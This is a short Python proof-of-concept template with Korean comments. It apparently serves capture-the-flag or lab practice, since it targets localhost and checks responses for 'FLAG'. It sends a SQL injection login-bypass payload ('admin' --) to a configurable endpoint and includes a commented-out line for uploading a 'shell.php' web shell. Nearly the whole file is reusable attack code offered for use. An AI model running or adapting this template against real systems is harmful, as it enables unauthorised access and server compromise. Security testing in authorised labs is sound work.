#!/usr/bin/env python3
import requests

# 수정: 대상 URL
TARGET = "http://localhost:3000"
ENDPOINT = "/login"  # 예: /login, /search, /upload 등
FULL_URL = TARGET + ENDPOINT

# 수정: 전송 방식 (GET / POST / FILES 중 선택)
HTTP_METHOD = "POST"  # "GET", "POST", "FILES"

# 수정: 페이로드
payload = {
    "username": "admin' --",
    "password": "pw"
}

# 파일 업로드 예시 (사용할 때만 files 파라미터 전달)
# files = {"file": open("shell.php", "rb")}

# 수정: 성공 조건 (응답에 포함되어야 하는 문자열)
SUCCESS_KEYWORDS = ["FLAG", "Welcome"]

def run_poc():
    print(f"[+] Target: {FULL_URL}")

    if HTTP_METHOD == "GET":
        res = requests.get(FULL_URL, params=payload)
    elif HTTP_METHOD == "POST":
        res = requests.post(FULL_URL, data=payload)
    elif HTTP_METHOD == "FILES":
        res = requests.post(FULL_URL, files=files)
    else:
        print("[-] 잘못된 HTTP_METHOD 값입니다.")
        return

    # 응답 내에 성공 키워드 포함 여부로 성공 판별
    if any(keyword in res.text for keyword in SUCCESS_KEYWORDS):
        print("[+] PoC 성공: 취약점 존재!")
        print(res.text)
    else:
        print("[-] PoC 실패: 취약점 없음")

if __name__ == "__main__":
    run_poc()
